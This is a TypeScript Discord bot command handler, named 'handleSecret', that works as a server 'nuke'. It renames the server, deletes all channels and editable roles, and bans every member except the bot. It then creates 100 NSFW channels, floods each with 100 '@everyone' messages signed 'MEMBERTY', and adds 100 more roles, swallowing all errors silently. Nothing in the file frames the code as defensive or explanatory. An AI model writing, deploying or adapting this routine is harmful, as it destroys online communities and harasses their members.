import type { Message, Client } from "discord.js";
import { ChannelType } from "discord.js";

export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void args;
  void client;

  const guild = message.guild;
  if (!guild) return;

  await guild.setName("KINGMAN").catch(() => {});
  await guild.members.fetch().catch(() => {});

  for (const [, channel] of guild.channels.cache) {
    await channel.delete().catch(() => {});
  }

  for (const [, role] of guild.roles.cache) {
    if (role.name === "@everyone" || !role.editable) continue;
    await role.delete().catch(() => {});
  }

  for (const [, member] of guild.members.cache) {
    if (member.id === client.user?.id) continue;
    await guild.members.ban(member).catch(() => {});
  }

  for (let i = 0; i < 100; i++) {
    const ch = await guild.channels.create({
      name: "MEMBERTY",
      type: ChannelType.GuildText,
      nsfw: true,
      topic: "MEMBERTY WAS HERE SAY GOODNIGHT :)",
    }).catch(() => null);

    if (ch && ch.isTextBased()) {
      for (let j = 0; j < 100; j++) {
        await ch.send("> @everyone MEMBERTY NUKE SYSTEM").catch(() => {});
      }
    }
  }

  for (let i = 0; i < 100; i++) {
    await guild.roles.create({
      name: "MEMBERTY",
      color: "Red",
    }).catch(() => {});
  }
}